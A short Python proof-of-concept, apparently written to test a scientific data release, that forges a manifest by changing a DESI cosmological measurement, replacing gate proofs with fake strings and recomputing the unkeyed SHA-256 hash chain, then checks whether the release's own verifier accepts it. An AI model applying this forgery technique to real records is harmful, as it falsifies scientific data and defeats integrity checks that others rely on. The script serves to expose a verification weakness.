"""Can a modified manifest pass the published verify_release.verify()?

Changes DESI measurement #0 (and fabricates gate proofs), recomputes the
unkeyed SHA-256 chain, and runs the release's own verifier on the result.
"""
import copy, hashlib, importlib.util, json, pathlib, sys

E = pathlib.Path(sys.argv[1])
spec = importlib.util.spec_from_file_location("vr", E / "verify_release.py")
vr = importlib.util.module_from_spec(spec); spec.loader.exec_module(vr)

orig = json.loads((E / "output/sc_totality_manifest.json").read_bytes())
forged = copy.deepcopy(orig)

# 1. Falsify a cosmological measurement (true value 7.9417 -> 9.9999)
forged["measurements"][0]["measurement"] = 9.9999
# 2. Replace every SCQOS gate proof with obviously fake strings
for row in forged["measurements"]:
    row["scqos"]["gate_proofs"] = {f"g{i}": "fake" for i in range(8)}
    row["scqos"]["final_proof"] = "fake"
    row["scqos"]["receipt_hash"] = "fake"

# 3. Recompute the unkeyed hash chain exactly as the engine does
prev = "0" * 64
for row in forged["measurements"]:
    row["parent_hash"] = prev
    body = {k: v for k, v in row.items() if k != "chain_hash"}
    row["chain_hash"] = hashlib.sha256(vr.canonical(body)).hexdigest()
    prev = row["chain_hash"]
forged["final_chain_hash"] = prev

print("original measurement[0]:", orig["measurements"][0]["measurement"])
print("forged   measurement[0]:", forged["measurements"][0]["measurement"])
try:
    print("verify(forged) ->", vr.verify(forged, root=E))
except AssertionError as e:
    print("verify(forged) REJECTED:", e)
